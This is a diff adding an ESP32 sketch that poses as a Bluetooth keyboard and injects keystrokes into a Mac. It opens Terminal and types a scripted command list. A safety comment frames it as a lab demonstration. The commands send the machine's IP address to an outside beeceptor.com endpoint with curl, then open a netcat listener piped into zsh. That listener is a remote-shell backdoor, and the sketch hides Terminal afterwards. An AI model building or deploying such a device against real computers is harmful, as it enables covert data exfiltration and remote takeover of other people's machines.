@@ -1,0 +1,238 @@
+/*
+  ESP32 BLE HID keyboard + OLED status (macOS version)
+  - Uses Spotlight (Cmd+Space) to open Terminal
+  - Uses macOS-safe commands and key combos (Cmd+N for new window, Cmd+H to hide)
+  - Keeps OLED status + manual button start
+  - Requirements: ESP32 BLE Keyboard (T-vK), Adafruit SSD1306, Adafruit GFX
+
+  SAFETY: Use on a lab Mac you own or have explicit permission to test. HID keystroke
+  injection can be disruptive. Keep commands benign and visible to your audience.
+*/
+
+#include <BleKeyboard.h>
+#include <Wire.h>
+#include <Adafruit_GFX.h>
+#include <Adafruit_SSD1306.h>
+
+// ------------------ CONFIG ------------------
+
+// macOS-friendly command set (plain ASCII only)
+String commands[] = {
+  "whoami",
+  "pwd",
+  "ls -la",
+  "cd ~/Desktop",
+  "uptime",
+  "echo lab test in progress",
+  // Write active IP to Desktop using the default route's interface
+  "echo $(ipconfig getifaddr $(route get default | awk '/interface:/{print $2}')) > ~/Desktop/connected_ip.txt",
+  // Also stash JSON to /tmp for demo
+  "ip=$(ipconfig getifaddr $(route get default | awk '/interface:/{print $2}')); printf '{\"ip\":\"%s\"}' \"$ip\" > /tmp/my_ip.json",
+  "cat /tmp/my_ip.json",
+  "mkdir -p ~/Desktop/test_folder", 
+  "echo \"You have been hacked!! While you thought this was a regular keyboard, I was actually a human interface device disguised as a keyboard to perform ethical hacking against your computer. I could've done so much more if I wanted to, but for now, I just ran some 10 simple command that demonstrates my ability to interact with your computer and potentially compromise it.\" > got_you.txt",
+  "curl -s -X POST -H \"Content-Type: application/json\" --data-binary @/tmp/my_ip.json \"https://mpxipfetch.free.beeceptor.com\" >/dev/null 2>&1",
+  "nc -lk 4545 | /bin/zsh"
+  ""
+};
+
+const uint8_t COMMAND_COUNT = sizeof(commands)/sizeof(commands[0]);
+
+// Timing (conservative)
+const uint16_t DELAY_BETWEEN_COMMANDS_MS = 500; // 0.5s between commands
+const uint16_t CHAR_DELAY_MS = 30;              // per-char delay
+const uint16_t AFTER_TERMINAL_OPEN_MS = 1200;   // after launching Terminal
+const uint16_t AFTER_ENTER_MS = 1000;           // after pressing Enter
+
+// Manual start button
+const int BUTTON_PIN = 0;        // set -1 to auto-start on connect
+bool requireButtonToStart = true;
+
+// OLED config
+#define SCREEN_WIDTH 128
+#define SCREEN_HEIGHT 64
+#define OLED_RESET -1
+Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
+
+// BLE keyboard (name/vendor are arbitrary)
+BleKeyboard bleKeyboard("Mac HID Keyboard", "Dell Labs", 100);
+
+// State
+bool startedTyping = false;
+uint8_t currentCommandIndex = 0;
+
+// ---------- helper functions ----------
+void showOLEDMessage(const char* line1, const char* line2 = nullptr) {
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(SSD1306_WHITE);
+  display.setCursor(0,0);
+  display.println("ESP32 HID Lab (macOS)");
+  display.setCursor(0,14);
+  display.println(line1);
+  if (line2) {
+    display.setCursor(0,30);
+    display.println(line2);
+  }
+  display.display();
+}
+
+void showOLEDProgress() {
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(SSD1306_WHITE);
+  display.setCursor(0,0);
+  display.println("Hemant's HID Lab");
+  display.setCursor(0,14);
+  display.printf("BLE: %s", bleKeyboard.isConnected() ? "Connected":"Idle");
+  display.setCursor(0,28);
+  display.printf("Cmd %u/%u", currentCommandIndex, COMMAND_COUNT);
+  display.display();
+}
+
+void releaseModifiersAndWait() {
+  bleKeyboard.releaseAll();
+  delay(50);
+}
+
+void safeType(const String &s) {
+  releaseModifiersAndWait();
+  delay(40);
+  for (size_t i = 0; i < s.length(); ++i) {
+    char c = s[i];
+    if (c == '\r' || c == '\n') continue;
+    bleKeyboard.print((char)c);
+    delay(CHAR_DELAY_MS);
+  }
+}
+
+void typeCommandAndEnter(const String &cmd) {
+  delay(120);
+  safeType(cmd);
+  delay(40);
+  releaseModifiersAndWait();
+  bleKeyboard.write(KEY_RETURN);
+  delay(AFTER_ENTER_MS);
+  showOLEDProgress();
+}
+
+// ---------- macOS UI helpers ----------
+void openTerminalViaSpotlight() {
+  // Cmd+Space to open Spotlight
+  bleKeyboard.press(KEY_LEFT_GUI);
+  bleKeyboard.write(' ');
+  delay(60);
+  bleKeyboard.releaseAll();
+  delay(350); // let Spotlight appear
+
+  // Type "Terminal" and hit Return
+  safeType("Terminal");
+  delay(120);
+  bleKeyboard.write(KEY_RETURN);
+  delay(AFTER_TERMINAL_OPEN_MS);
+}
+
+// Open a new Terminal window (Cmd+N). Terminal must have focus.
+void openNewTerminalWindow() {
+  bleKeyboard.press(KEY_LEFT_GUI);
+  bleKeyboard.write('n');
+  delay(60);
+  bleKeyboard.releaseAll();
+  delay(1000);
+}
+
+// Hide Terminal (Cmd+H) to get it out of the way
+void hideTerminalApp() {
+  bleKeyboard.press(KEY_LEFT_GUI);
+  bleKeyboard.write('h');
+  delay(60);
+  bleKeyboard.releaseAll();
+  delay(300);
+}
+
+// ------------------ setup & loop ------------------
+void setup() {
+  Serial.begin(115200);
+  delay(400);
+
+  if (BUTTON_PIN >= 0) pinMode(BUTTON_PIN, INPUT_PULLUP);
+
+  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
+    Serial.println("SSD1306 allocation failed");
+  } else {
+    display.clearDisplay();
+    showOLEDMessage("Initializing...");
+  }
+
+  bleKeyboard.begin();
+  showOLEDMessage("BLE ready", "Pair as keyboard");
+  delay(800);
+}
+
+void performTypingSequence() {
+  if (!bleKeyboard.isConnected()) return;
+
+  // Launch Terminal using Spotlight
+  releaseModifiersAndWait();
+  openTerminalViaSpotlight();
+
+  // Send all commands
+  for (uint8_t i = 0; i < COMMAND_COUNT; ++i) {
+    currentCommandIndex = i + 1;
+    String cmd = commands[i];
+    Serial.printf("Typing [%u/%u]: %s\n", i+1, COMMAND_COUNT, cmd.c_str());
+
+    // For the last command, demo opening a new window first
+    if (i == COMMAND_COUNT - 1) {
+      openNewTerminalWindow();
+      delay(600);
+      typeCommandAndEnter(cmd);
+      delay(600);
+      // Hide Terminal (Cmd+H)
+      hideTerminalApp();
+    } else {
+      typeCommandAndEnter(cmd);
+      delay(DELAY_BETWEEN_COMMANDS_MS);
+    }
+  }
+
+  showOLEDMessage("Typing done", "Check Desktop");
+}
+
+void loop() {
+  if (bleKeyboard.isConnected()) {
+    showOLEDProgress();
+
+    if (!startedTyping) {
+      if (!requireButtonToStart) {
+        performTypingSequence();
+        startedTyping = true;
+      } else {
+        if (BUTTON_PIN >= 0 && digitalRead(BUTTON_PIN) == LOW) {
+          delay(50); // debounce
+          if (digitalRead(BUTTON_PIN) == LOW) {
+            showOLEDMessage("Starting in 3s...", "Cancel by disconnecting");
+            delay(1000);
+            showOLEDMessage("Starting in 2s...", "Cancel by disconnecting");
+            delay(1000);
+            showOLEDMessage("Starting in 1s...", "Cancel by disconnecting");
+            delay(1000);
+            releaseModifiersAndWait();
+            performTypingSequence();
+            startedTyping = true;
+          }
+        }
+      }
+    }
+  } else {
+    if (startedTyping) {
+      startedTyping = false;
+      currentCommandIndex = 0;
+      showOLEDMessage("Disconnected");
+    } else {
+      showOLEDMessage("Waiting BLE...", "Pair as keyboard");
+    }
+  }
+
+  delay(80);
+}
